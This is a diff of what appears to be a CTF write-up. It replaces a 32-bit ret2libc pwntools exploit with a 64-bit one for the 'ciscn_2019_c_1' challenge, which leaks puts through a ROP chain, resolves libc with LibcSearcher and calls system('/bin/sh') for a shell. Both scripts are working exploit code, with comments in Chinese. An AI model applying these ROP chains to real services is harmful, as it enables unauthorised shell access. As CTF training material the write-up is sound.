@@ -13,33 +13,46 @@ excerpt: exp
 
 ```python
 from pwn import *
+from LibcSearcher import *
+p = process('./ciscn_2019_c_1')
+# p = remote('node4.buuoj.cn',29563) 
+elf = ELF('./ciscn_2019_c_1')
 
-# p = process('./pwn')
-p = remote('node4.buuoj.cn',28818)
-e = ELF('./pwn')
+ret=0x4006b9
+rdi=0x400c83
+main=elf.sym['main']
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
 
-#payload 1
-payload1 = '\x00' + '\xff' * 7
-p.sendline(payload1)
-p.recvuntil("Correct\n")
+#第一次攻击绕过函数
+p.sendlineafter(b'Input your choice!\n',b'1')
+payload=b'\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+p.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)
+ 
+ 
+ 
+p.recvline()	#接收字符串Ciphertext
+p.recvline()    #加密后的密文
+#这里注意需要接收2次
+ 
+puts_addr=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))  #得到 puts 函数 的地址
 
-#payload 2
-payload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)
+print(hex(puts_addr))
 
-p.sendline(payload2)
-
-# leak addr
-write_got = u32(p.recv(4))
-print(hex(write_got))
-
-#payload 3
-libc = ELF("./libc-2.23.so")
-libc.address =  write_got - libc.sym['write']
-system = libc.sym["system"]
-binsh = next(libc.search(b"/bin/sh"))
-p.sendline(payload1)
-payload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)
-p.sendline(payload3)
-
+libc=LibcSearcher('puts',puts_addr) #获取libc的版本
+offset=puts_addr-libc.dump('puts') #计算偏移量
+binsh=offset+libc.dump('str_bin_sh') #计算字符串"/bin/sh"的地址
+system=offset+libc.dump('system') #计算函数system的地址
+ 
+#第二次攻击getshell
+ 
+p.sendlineafter(b'Input your choice!\n',b'1')     #   再一次执行 一遍流程
+payload=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
+p.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)
 p.interactive()
+
+
+
+# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题
+# https://www.cnblogs.com/ZIKH26/articles/15996874.html
 ```
